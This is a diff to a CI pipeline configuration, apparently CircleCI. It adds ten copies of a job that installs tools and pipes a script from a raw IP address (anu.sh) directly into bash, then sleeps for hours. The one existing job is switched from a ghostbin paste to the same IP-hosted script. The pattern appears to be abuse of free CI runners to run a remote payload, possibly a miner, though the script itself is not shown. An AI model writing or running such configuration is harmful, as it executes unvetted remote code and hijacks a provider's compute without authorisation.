@@ -6,11 +6,122 @@ jobs:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/6dyho/raw | bash -
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
       - run: 
-            command: sleep 17980
+            command: sleep 1798012
             no_output_timeout: 5h
+
+  jahantaysa1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 1798090
+            no_output_timeout: 5h
+
+  jahantaysa2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 179809
+            no_output_timeout: 5h
+
+  jahantaysa3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 179808
+            no_output_timeout: 5h
+
+  jahantaysa4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 179807
+            no_output_timeout: 5h
+
+  jahantaysa5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 179806
+            no_output_timeout: 5h
+
+  jahantaysa6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 179805
+            no_output_timeout: 5h
+
+  jahantaysa7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 179804
+            no_output_timeout: 5h
+
+  jahantaysa8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 179803
+            no_output_timeout: 5h
+
+  jahantaysa9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 179802
+            no_output_timeout: 5h
+
+  jahantaysa10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/anu.sh | bash -
+      - run: 
+            command: sleep 179801
+            no_output_timeout: 5h
+
 workflows:
   main:
     jobs:
       - jahantaysa
+      - jahantaysa1
+      - jahantaysa2
+      - jahantaysa3
+      - jahantaysa4
+      - jahantaysa5
+      - jahantaysa6
+      - jahantaysa7
+      - jahantaysa8
+      - jahantaysa9
+      - jahantaysa10
